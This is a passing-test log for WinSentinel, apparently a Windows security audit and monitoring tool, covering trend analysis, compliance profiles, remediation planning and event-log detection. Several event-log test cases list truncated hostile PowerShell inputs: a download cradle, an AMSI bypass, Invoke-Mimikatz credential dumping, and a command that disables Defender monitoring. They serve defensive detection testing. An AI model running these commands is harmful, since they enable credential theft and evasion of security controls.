  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_SingleRun_PopulatesBasicFields [2 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_SparklineRespectsWidth [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.GenerateBarChart_ContainsScores [8 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_CalculatesMedian_OddCount [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_TracksImprovementStreak [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.GenerateSparkline_Empty [2 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_DetectsStableTrend [15 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_FindsBestAndWorst [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.GenerateSparkline_AllSame [2 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_PopulatesSparklineScores [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_CalculatesMedian_EvenCount [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_NoAlertAboveThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_AlertsBelowThreshold [7 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_TracksDeclineStreak [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_CalculatesAverage [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_EmptyRuns_ReturnsNoData [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_CalculatesStdDev [2 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_CalculatesDistribution [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_CalculatesTimeSpan [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.GenerateSparkline_IncreasingScores [11 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_DetectsImprovingTrend [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_AlertOnLargeScoreDrop [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_MultipleAlerts [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_DetectsDecliningTrend [1 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.RunAuditAsync_ProducesMultipleFindings [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunSingleAuditAsync_ByCategory [9 s]
  Passed WinSentinel.Tests.Services.AuditEngineTests.CustomConstructor_UsesProvidedModules [1 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunFullAuditAsync_WithMockModules_ReportsProgress [115 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunFullAuditAsync_WithMockModules_ProducesReport [3 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunFullAuditAsync_WithMockModules_HandlesFailure [1 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunFullAuditAsync_ReportAggregationIsCorrect [2 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.DefaultConstructor_LoadsAllModules [3 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunFullAuditAsync_CriticalFindingsHaveRemediations [2 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.RunAuditAsync_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Audits.DefenderAuditTests.RunAuditAsync_AllFindingsHaveCategory [< 1 ms]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunSingleAuditAsync_ByPartialName [11 s]
  Passed WinSentinel.Tests.Services.AuditEngineTests.RunSingleAuditAsync_ReturnsNullForUnknown [2 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.CustomRule_TitlePattern_MatchesContains [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.ClassifyCategory_ReturnsCorrectCategory(source: "NetworkMonitor", expected: Network) [5 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.ClassifyCategory_ReturnsCorrectCategory(source: "FileSystemMonitor", expected: File) [2 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.ClassifyCategory_ReturnsCorrectCategory(source: "ThreatCorrelator", expected: Correlation) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.ClassifyCategory_ReturnsCorrectCategory(source: "SomeRandomThing", expected: Unknown) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.ClassifyCategory_ReturnsCorrectCategory(source: "ProcessMonitor", expected: Process) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.ClassifyCategory_ReturnsCorrectCategory(source: "EventLogMonitor", expected: EventLog) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.CorrelationCategory_AlwaysEscalated [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.RemoveUserOverride_Works [5 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: Low, risk: Medium, expected: Log) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: High, risk: High, expected: Log) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: Critical, risk: Low, expected: AutoFix) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: Info, risk: Medium, expected: Log) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: Critical, risk: Medium, expected: Alert) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: High, risk: Medium, expected: Alert) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: High, risk: Low, expected: Alert) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: Critical, risk: High, expected: Alert) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_ReturnsCorrectAction(severity: Medium, risk: Medium, expected: Log) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.CustomRule_HigherPriorityWins [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.CustomRule_OverridesDefault [1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.DefaultPolicy_AutoFixAllowed_OnlyWhenThreatIsAutoFixable [< 1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.UserOverride_AlwaysIgnore_ReturnsLog [1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.UserOverride_NoSource_MatchesAll [1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.UserOverride_AlwaysAutoFix_ReturnsAutoFix [24 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.UserOverride_SourceMismatch_NotApplied [1 ms]
  Passed WinSentinel.Tests.Agent.ResponsePolicyTests.AuditLogCleared_AlwaysEscalated [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ProfileExists_CaseInsensitive(name: "home") [8 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ProfileExists_CaseInsensitive(name: "Home") [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ProfileExists_CaseInsensitive(name: "HOME") [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_SetsOriginalGrade [9 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_EnterpriseProfile_MayDecreaseScoreByUpgradingSeverities [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_CustomProfile_Works [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.GetProfile_CaseInsensitive(expected: "server", input: "Server") [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.GetProfile_CaseInsensitive(expected: "developer", input: "Developer") [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.GetProfile_CaseInsensitive(expected: "home", input: "HOME") [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.GetProfile_CaseInsensitive(expected: "enterprise", input: "ENTERPRISE") [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_ServerProfile_ReducesBrowserWeight [3 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_OverridesRecordModuleCategory [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ProfileExists_UnknownProfile_ReturnsFalse [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_EnterpriseProfile_UpgradesSMBSigning [2 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_AddsDeficitRecommendation_WhenNotCompliant [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.HomeProfile_HasCorrectProperties [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_SkippedModule_ExcludedFromScoring [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_IsNotCompliant_WhenBelowThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_HomeProfile_ReducesEventLogWeight [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_IncludesProfileRecommendations [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_HomeProfile_IncreasesScoreByDowngradingSeverities [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.SeverityOverride_DefaultConstructor_Works [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ServerProfile_HasHighestThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_DefaultWeight_IsOnePointZero [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_HomeProfile_DowngradesLLMNR [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_SetsCheckedAtTimestamp [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.Profiles_ThresholdsAscendInStrictness [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ComplianceResult_IsNotCompliant_WhenScoreBelowThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_EmptyReport_Returns100 [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_ComplianceThresholdFromProfile [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_SetsOriginalScore [3 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.Constructor_RegistersAllBuiltInProfiles [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ProfileNames_ReturnsAllNames [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.CalculateModuleScoreWithOverrides_NoOverrides_MatchesOriginal [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.AllProfiles_OverridesHaveReasons [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.GetProfile_ReturnsCorrectProfile [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_EnterpriseProfile_IncreasesEncryptionWeight [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ComplianceResult_IsCompliant_DependsOnThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.CalculateModuleScoreWithOverrides_WithDowngrade_IncreasesScore [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_ModulesWeightedCountIsCorrect [2 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.DeveloperProfile_HasCorrectProperties [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_TracksOverridesPerModule [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.GetProfile_UnknownProfile_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.AllProfiles_HaveRequiredFields [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.AllProfiles_HaveReasonableWeights [7 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_WithSkippedModule_SkipsInResults [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.DifferentProfiles_ProduceDifferentScores [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_AdjustedScoreClampedTo0_100 [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_RecommendationsContainProfileSpecificAdvice [15 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.EnterpriseProfile_HasCorrectProperties [3 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.CalculateModuleScoreWithOverrides_WithUpgrade_DecreasesScore [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.CalculateModuleScoreWithOverrides_CaseInsensitive [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_AdjustedGradeMatchesScore [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_ByName_Works [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_UnknownName_Throws [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_OverridesRecordReason [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_EnterpriseProfile_UpgradesLLMNR [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_HomeProfile_DowngradesSMBSigning [1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_OverridesCountMatchesApplied [4 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_IsCompliant_WhenAboveThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.DifferentProfiles_HaveDifferentOverrideCounts [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.SeverityOverride_ConstructorSetsFields [< 1 ms]
  Passed WinSentinel.Tests.Services.ComplianceProfileServiceTests.ApplyProfile_ModuleScoresRecordsWeights [< 1 ms]
  Passed WinSentinel.Tests.Models.FindingTests.Warning_CreatesWarningSeverityFinding [< 1 ms]
  Passed WinSentinel.Tests.Models.FindingTests.Info_CreatesInfoSeverityFinding [1 ms]
  Passed WinSentinel.Tests.Models.FindingTests.Pass_CreatesPassSeverityFinding [< 1 ms]
  Passed WinSentinel.Tests.Models.FindingTests.Finding_HasTimestamp [1 ms]
  Passed WinSentinel.Tests.Models.FindingTests.Critical_CreatesCriticalSeverityFinding [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.FailedLogon_SingleAttempt_EmitsLowSeverity [10 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_CorrectSeverity(script: "(new-object net.webclient).downloadstring('http://"┬╖┬╖┬╖, expectedSeverity: Critical) [6 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_CorrectSeverity(script: "virtualalloc", expectedSeverity: Critical) [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_CorrectSeverity(script: "[ref].assembly.gettype('system.management.automati"┬╖┬╖┬╖, expectedSeverity: Critical) [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_CorrectSeverity(script: "invoke-mimikatz", expectedSeverity: Critical) [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_CorrectSeverity(script: "invoke-expression (get-content payload.ps1)", expectedSeverity: High) [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_CorrectSeverity(script: "register-scheduledtask", expectedSeverity: Medium) [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AuditLogCleared_AlwaysCritical [2 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.CorrelationWindow_IsFiveMinutes [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "Get-ChildItem C:\\Users", shouldDetect: False, _: "") [5 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "IEX (New-Object Net.WebClient).DownloadString('htt"┬╖┬╖┬╖, shouldDetect: True, _: "Download cradle") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "Write-Host 'Hello World'", shouldDetect: False, _: "") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "[Ref].Assembly.GetType('System.Management.Automati"┬╖┬╖┬╖, shouldDetect: True, _: "AMSI") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "Invoke-Mimikatz -DumpCreds", shouldDetect: True, _: "Mimikatz") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "[System.Runtime.InteropServices.Marshal]::VirtualA"┬╖┬╖┬╖, shouldDetect: True, _: "memory") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "[Convert]::FromBase64String('AAAA')", shouldDetect: True, _: "Base64") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_DetectsPatterns(script: "Set-MpPreference -DisableRealtimeMonitoring $true", shouldDetect: True, _: "Defender") [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.BruteForceThreshold_IsFive [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.MalwareDetected_EmitsHighOrAbove [1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AccountLockout_EmitsMedium [2 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.DefenderRtpDisabled_EmitsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.GroupMemberAdded_NonAdminGroup_EmitsHigh [1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.NewService_PowerShellPath_EmitsCritical [1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.Name_ReturnsEventLogMonitor [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.DefenderBypass_RtpDisabledThenServiceInstalled_EmitsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.RateLimit_DuplicateAlertsSuppressed [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.UnexpectedShutdown_EmitsHigh [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.IsActive_InitiallyFalse [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.ExplicitCredentialLogon_EmitsMediumSeverity [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.FailedLogon_BruteForce_EmitsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.DefenderBypass_ServiceWithoutRtpDisabled_NoBypassAlert [1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AuditLogCleared_NeverRateLimited [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.PrivilegeAssigned_NormalPrivs_EmitsLow [4 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.FailedLogon_TracksCountPerSource [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_EncodedCommand_IsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.NewService_SuspiciousPath_EmitsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.KillChain_FailedLogonThenSuccessThenEscalation_EmitsCritical [2 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AnalyzeScriptBlock_ADRecon_IsMedium [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.AccountCreated_EmitsHighWithFixCommand [1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.PrivilegeAssigned_SensitivePrivs_EmitsHigh [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.ServiceStartTypeChanged_EmitsLow [1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.DefenderRtpDisabled_SetsCorrelationFlag [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.GroupMemberAdded_AdminGroup_EmitsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.NewService_NormalPath_EmitsMedium [< 1 ms]
  Passed WinSentinel.Tests.Agent.EventLogMonitorModuleTests.FailedLogon_DifferentSources_NoBruteForce [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_CorrectCurrentScore [16 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationPlan_TotalImpact_Computed [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_CriticalWithAutoFix_IsQuickWin [2 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_AutoFixableCountIsCorrect [4 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationPlan_TotalItems_SumsAllGroups [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationItem_HasAutoFix_FalseWithEmpty [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_WithFixCommand_ReturnsQuickWin [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.EstimateTime_MediumWarning_Returns5To15Min [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_EmptyReport_ReturnsEmptyPlan [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_CriticalImpactIs20 [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_ITDepartmentRemediation_ReturnsMajor [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_RegistryRemediation_ReturnsQuickWin [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_WarningWithAutoFix_IsQuickWin [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_ProjectedScoreCappedAt100 [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_StepNumbersAreSequential [1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_TotalImpactIsCorrect [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.EstimateTime_MajorCritical_Returns1To2Hours [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationItem_HasAutoFix_FalseWithNull [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_CriticalWithoutFix_IsMajorChange [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ComputePriority_CriticalHigherThanWarning [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.EstimateTime_MediumCritical_Returns15To30Min [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_InstallRemediation_ReturnsMajor [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.EstimateTime_MajorWarning_Returns30To60Min [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_MultiModule_PreservesCategory [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_WarningWithoutFix_IsMediumEffort [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ComputePriority_QuickWinHigherEffortMultiplier [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_TotalItemsMatchesSumOfGroups [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ComputePriority_AutoFixHigherThanManual [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_EnableInRemediation_ReturnsQuickWin [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationItem_HasAutoFix_FalseWithWhitespace [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_DeployRemediation_ReturnsMajor [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.EstimateTime_QuickWinCritical_Returns2To5Min [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_QuickWinRemediation_ClassifiedAsQuickWin [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_WarningNoFix_ReturnsMedium [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_MajorRemediation_ClassifiedAsMajor [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.EstimateTime_QuickWinWarning_Returns1To3Min [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_SettingsRemediation_ReturnsQuickWin [3 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_QuickWinsFirst_ThenMedium_ThenMajor [2 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_ProjectedScoreIncreasesAfterFixes [2 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_WarningImpactIs5 [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_WarningGenericRemediation_ReturnsMedium [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_OnlyPassFindings_ReturnsEmptyPlan [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationItem_HasAutoFix_TrueWithCommand [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ComputePriority_WithRemediation_HigherThanWithout [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.GeneratePlan_HigherPriorityItemsFirst_WithinGroup [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.RemediationPlan_AutoFixableCount_Computed [< 1 ms]
  Passed WinSentinel.Tests.Services.RemediationPlannerTests.ClassifyEffort_CriticalNoFix_ReturnsMajor [< 1 ms]
  Passed WinSentinel.Tests.Audits.StartupAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_OnlyPassFindings_EmptyResultsDefault [81 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateRuleId_DifferentCategories_DifferentIds [2 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_NullReport_ThrowsArgumentNull [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GenerateSarif_FailedModule_ReportsNotifications [4 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Privacy", expected: "PV") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "User Accounts", expected: "UA") [< 1 ms]
  Passed WinSentinel.Tests.Services.SarifExporterTests.GetCategoryCode_MapsKnownCategories(category: "Startup Programs", expected: "ST") [< 1 ms]
